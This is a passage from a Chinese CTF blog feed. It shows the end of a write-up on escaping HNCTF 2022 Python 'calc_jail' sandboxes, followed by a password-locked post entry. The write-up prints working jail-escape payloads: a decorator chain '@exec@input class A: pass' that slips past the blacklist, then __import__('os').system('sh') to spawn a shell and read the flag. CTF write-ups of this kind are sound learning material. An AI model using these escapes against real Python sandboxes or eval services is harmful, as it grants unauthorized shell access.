itertools.count(0)]]</code></pre><p>输入payload之后 会不停的重放&#x2F;bin&#x2F;sh  说是无限迭代器 但其实也有次数 手速要快  输入<code> ls cat flag</code> 即可得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805213426632.png" alt="image-20230805213426632"></p><p><strong>NSSCTF{0047e0c3-4c98-4795-aa7f-6e522649c3d6}</strong></p><h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level7-函数装饰器、类的定义"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level7-函数装饰器、类的定义" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level7(函数装饰器、类的定义)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level7(函数装饰器、类的定义)</h2><p>给了一个窗口  先查看黑名单</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805214036074.png" alt="image-20230805214036074"></p><p>输入<code>E</code> 可以输入多行命令 但是要求结尾必须是<code>--HNCTF</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805214119619.png" alt="image-20230805214119619"></p><p>这时候可以使用函数装饰器<code>@</code> 和类的定义</p><pre><code>@exec@inputclass A: pass</code></pre><p>前两个是函数装饰器: <font color='red'>把带有@的函数放到某个函数的定义处，相当于执行了一次@后的函数</font></p><p>后面是类定义 这里的<code>pass</code>主要作用是占据位置  让代码整体完整 定义空类会报错 </p><p>成功进入main函数主体  在执行命令 进入shell即可</p><pre><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code></pre><p>读到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805221429156.png" alt="image-20230805221429156"></p><p>下面是源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805215144009.png" alt="image-20230805215144009"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805215207054.png" alt="image-20230805215207054"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初识沙箱逃逸&quot;&gt;&lt;a href=&quot;#初识沙箱逃逸&quot; class=&quot;headerlink&quot; title=&quot;初识沙箱逃逸&quot;&gt;&lt;/a&gt;初识沙箱逃逸&lt;/h1&gt;&lt;h2 id=&quot;HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-沙箱</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="沙箱逃逸" scheme="http://w3nx1z1.github.io/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>春苗进阶考核实操</title>
    <link href="http://w3nx1z1.github.io/2023/07/28/%E6%98%A5%E8%8B%97%E5%8F%96%E8%AF%81%E8%80%83%E6%A0%B8%E5%AE%9E%E6%93%8D/"/>
    <id>http://w3nx1z1.github.io/2023/07/28/%E6%98%A5%E8%8B%97%E5%8F%96%E8%AF%81%E8%80%83%E6%A0%B8%E5%AE%9E%E6%93%8D/</id>
    <published>2023-07-28T07:42:35.888Z</published>
    <updated>2023-07-28T07:47:20.376Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="658232ebc52374337ef92f76e3b2cbd47c6a914a949f5e131da3329dee2798c0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
</feed>
